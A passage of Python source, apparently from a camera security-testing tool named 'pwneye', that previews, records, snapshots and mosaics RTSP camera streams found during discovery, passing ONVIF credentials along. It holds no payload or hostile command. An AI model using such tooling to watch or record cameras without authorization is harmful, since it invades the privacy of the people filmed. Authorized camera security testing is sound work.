    Open all discovered RTSP channels inside a single mosaic viewer window.
    """
    attempts = [entry.attempt for entry in channels]

    tui.info("Opening multi-channel live preview...")
    opened, detail = viewer.open_preview(
        attempts,
        onvif_context=_resolve_viewer_onvif_context(args, onvif_credentials),
        launch_options=ViewerLaunchOptions(allow_recording=args.record is None),
    )

    if opened:
        return

    if detail:
        tui.error("Unable to open the multi-channel viewer ({detail})", detail=detail)
    else:
        tui.error("Unable to open the multi-channel viewer")

def _run_multichannel_preview_session(
    selected_attempt: RtspAttempt,
    channels: list[RtspChannelEntry],
    args: argparse.Namespace,
    tui: TUI,
    onvif_credentials: tuple[str, str] | None = None,
) -> None:
    """
    Keep the tool alive while the user opens multiple discovered RTSP channels.
    """
    _play_rtsp_stream(
        selected_attempt,
        args,
        tui,
        onvif_credentials=onvif_credentials,
        detach=True,
    )

    while True:
        extra_option = (
            RTSP_OPEN_ALL_CHANNELS_OPTION
            if _allow_open_all_channels(args)
            else None
        )
        selected = tui.select_channel(
            channels,
            prompt=RTSP_CHANNEL_SELECT_PROMPT,
            extra_option=extra_option,
        )
        if selected is None:
            _open_multichannel_viewer(args, channels, tui, onvif_credentials)
            return

        current_attempt = selected.attempt
        _play_rtsp_stream(
            current_attempt,
            args,
            tui,
            onvif_credentials=onvif_credentials,
            detach=True,
        )

def _run_multichannel_snapshot_preview_session(
    selected_attempt: RtspAttempt,
    channels: list[RtspChannelEntry],
    args: argparse.Namespace,
    tui: TUI,
    onvif_credentials: tuple[str, str] | None = None,
) -> None:
    """
    Keep the tool alive while the user captures snapshots and opens previews
    from multiple discovered RTSP channels.
    """
    current_attempt = selected_attempt

    while True:
        _capture_rtsp_snapshot(current_attempt, args, tui)
        _play_rtsp_stream(
            current_attempt,
            args,
            tui,
            onvif_credentials=onvif_credentials,
            detach=True,
        )
        current_attempt = tui.select_channel(
            channels,
            prompt=RTSP_CHANNEL_SELECT_PROMPT,
        ).attempt

def _run_multichannel_snapshot_session(
    selected_attempt: RtspAttempt,
    channels: list[RtspChannelEntry],
    args: argparse.Namespace,
    tui: TUI,
) -> None:
    """
    Keep the tool alive while the user captures snapshots from multiple
    discovered RTSP channels without opening live preview.
    """
    current_attempt = selected_attempt

    while True:
        _capture_rtsp_snapshot(current_attempt, args, tui)
        current_attempt = tui.select_channel(
            channels,
            prompt=RTSP_CHANNEL_SELECT_PROMPT,
        ).attempt

def _preview_and_record_rtsp_stream(
    attempt: RtspAttempt,
    args: argparse.Namespace,
    tui: TUI,
    onvif_credentials: tuple[str, str] | None = None,
) -> None:
    """
    Open the live preview while recording the RTSP stream in background.
    """
    output_path, conflicting_path = resolve_recording_path_with_notice(args.record, args.target)
    output_path.parent.mkdir(parents=True, exist_ok=True)
    temp_path = _build_temp_recording_path(output_path)

    if conflicting_path is not None:
        tui.warning(
            "The recording file already exists at {path}",
            path=conflicting_path,
        )

    tui.info("Recording RTSP stream to {path}", path=output_path)

    recorder: subprocess.Popen | None = None
    stderr_path: Path | None = None

    try:
        stderr_path = Path(tempfile.mkstemp(prefix="pwneye-ffmpeg-capture-", suffix=".log")[1])
        recorder = _start_ffmpeg_capture(attempt, temp_path, stderr_path)

        if args.legacy:
            tui.info("Opening live preview with ffplay...")
            subprocess.run(
                _build_ffplay_cmd(attempt),
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        else:
            tui.info("Opening live preview in the dedicated client...")
            process, viewer_stderr, detail = viewer.open_preview_managed(
                [attempt],
                onvif_context=_resolve_viewer_onvif_context(args, onvif_credentials),
                launch_options=ViewerLaunchOptions(allow_recording=False),
            )
            if process is None:
                if detail:
                    tui.error("Unable to open the live preview ({detail})", detail=detail)
                else:
                    tui.error("Unable to open the live preview")
                _stop_ffmpeg_recording(recorder)
                return

            try:
                process.wait()
            finally:
                if viewer_stderr is not None:
                    viewer_stderr.unlink(missing_ok=True)

        if recorder.poll() is None:
            tui.info("Stopping background recording...")
        exit_code = _stop_ffmpeg_recording(recorder)

        if exit_code in (0, 255, None) or (temp_path.exists() and temp_path.stat().st_size > 0):
            finalize_error = _finalize_recording_to_mp4(temp_path, output_path, tui)
            if finalize_error is None:
                _report_saved_recording(output_path, tui)
            else:
                tui.error("Unable to finalize the recording to MP4 ({detail})", detail=finalize_error)
        else:
            error_detail = _read_process_error(stderr_path) if stderr_path else None
            if error_detail:
                tui.error("The background recording ended unexpectedly ({detail})", detail=error_detail)
            else:
                tui.error("The background recording ended unexpectedly")

    except KeyboardInterrupt:
        tui.console.file.write("\r\033[2K")
        tui.console.file.flush()
        exit_code = _stop_ffmpeg_recording(recorder)
        if exit_code in (0, 255, None) or (temp_path.exists() and temp_path.stat().st_size > 0):
            finalize_error = _finalize_recording_to_mp4(temp_path, output_path, tui)
            if finalize_error is None:
                _report_saved_recording(output_path, tui)
                return
            tui.error("Unable to finalize the recording to MP4 ({detail})", detail=finalize_error)
            return

        tui.error("Unable to finalize the recording cleanly")
    except subprocess.CalledProcessError:
        _stop_ffmpeg_recording(recorder)
        tui.error("Unable to open the RTSP stream with ffplay")
    finally:
        _stop_ffmpeg_recording(recorder)
        if stderr_path is not None:
            stderr_path.unlink(missing_ok=True)
        temp_path.unlink(missing_ok=True)

def _handle_rtsp_stream(
    attempt: RtspAttempt,
    args: argparse.Namespace,
    tui: TUI,
    onvif_credentials: tuple[str, str] | None = None,
    warn_rtsp_instability: bool = True,
) -> None:
    """
    Handle post-discovery RTSP actions such as preview and recording.
    """
    if warn_rtsp_instability:
        _warn_before_rtsp_stream(
            tui,
            onvif_credentials=onvif_credentials,
        )

    attempt, discovered_channels = _maybe_select_rtsp_channel(
        attempt,
        args,
        tui,
        allow_open_all=_allow_open_all_channels(args),
    )

    if attempt is None:
        if discovered_channels and len(discovered_channels) > 1:
            _open_multichannel_viewer(args, discovered_channels, tui, onvif_credentials)
            return

        tui.error("Unable to open the multi-channel viewer")
        return

    if args.no_video and args.record is None and args.snapshot is None:
        tui.info("Skipping live preview due to --no-video")
        return

    if args.record is not None and args.no_video:
        _record_rtsp_stream(attempt, args, tui)
        return

    if args.record is not None and not args.no_video:
        _preview_and_record_rtsp_stream(
            attempt,
            args,
            tui,
            onvif_credentials=onvif_credentials,
        )
        return

    if args.snapshot is not None and args.no_video:
        if discovered_channels and len(discovered_channels) > 1:
            _run_multichannel_snapshot_session(
                attempt,
                discovered_channels,
                args,
                tui,
            )
            return
        _capture_rtsp_snapshot(attempt, args, tui)
        return

    if args.snapshot is not None and not args.no_video:
        if discovered_channels and len(discovered_channels) > 1:
            _run_multichannel_snapshot_preview_session(
                attempt,
                discovered_channels,
                args,
                tui,
                onvif_credentials=onvif_credentials,
            )
            return
        _capture_rtsp_snapshot(attempt, args, tui)
        _play_rtsp_stream(attempt, args, tui, onvif_credentials=onvif_credentials)
        return

    if discovered_channels and len(discovered_channels) > 1:
        _run_multichannel_preview_session(
            attempt,
            discovered_channels,
            args,
            tui,
            onvif_credentials=onvif_credentials,
        )
        return

    _play_rtsp_stream(attempt, args, tui, onvif_credentials=onvif_credentials)
